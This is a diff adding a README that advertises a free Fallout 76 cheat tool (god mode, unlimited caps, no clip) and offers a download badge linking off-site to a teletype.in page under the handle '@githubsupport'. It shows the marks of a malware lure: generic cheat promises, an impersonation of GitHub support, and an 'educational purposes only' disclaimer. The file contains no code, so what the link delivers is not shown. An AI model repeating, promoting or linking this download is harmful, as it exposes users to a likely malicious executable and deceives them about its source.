@@ -1,0 +1,32 @@
+# Fallout 76 Exploits Free Download 2025
+
+[![Version](https://img.shields.io/badge/Version-2025-blue?logo=windows)](https://github.com) [![Platform](https://img.shields.io/badge/Platform-Windows-red?logo=windows)](https://github.com) [![Status](https://img.shields.io/badge/Status-Active-brightgreen?logo=power)](https://github.com) [![License](https://img.shields.io/badge/License-Free-purple?logo=opensourceinitiative)](https://github.com)
+
+🎮 **Fallout 76 Hack** - Unleash the ultimate power in the wasteland! 🔥  
+
+⚡ **Features**:  
+- **God Mode** 🛡️ - Become invincible against any enemy.  
+- **Unlimited Caps** 💰 - Never worry about currency again.  
+- **One-Hit Kill** ⚔️ - Eliminate foes with a single strike.  
+- **No Clip** 👻 - Move through walls and explore hidden areas.  
+- **Stealth Mode** 🕵️ - Remain undetected by enemies and players.  
+
+📥 **Download Now**:  
+[![Download](https://img.shields.io/badge/Download-Here-FF5733?logo=steam&style=for-the-badge)](https://teletype.in/@githubsupport/aHN9l6m-mbF?5775ECF84788429E9D58024355403621)  
+
+🔧 **Requirements**:  
+- Windows 10/11 (64-bit)  
+- Latest .NET Framework  
+- Fallout 76 (v2025+)  
+
+⚠️ **Disclaimer**:  
+This tool is for **educational purposes only**. Use at your own risk. The developers are not responsible for any bans or violations of game policies.  
+
+🌟 **Support**:  
+Like our work? Star ⭐ the repo and share with fellow wastelanders!  
+
+📜 **Credits**:  
+- Built with ❤️ by the modding community.  
+- Special thanks to contributors and testers.  
+
+🚀 **Stay tuned for more epic hacks!**
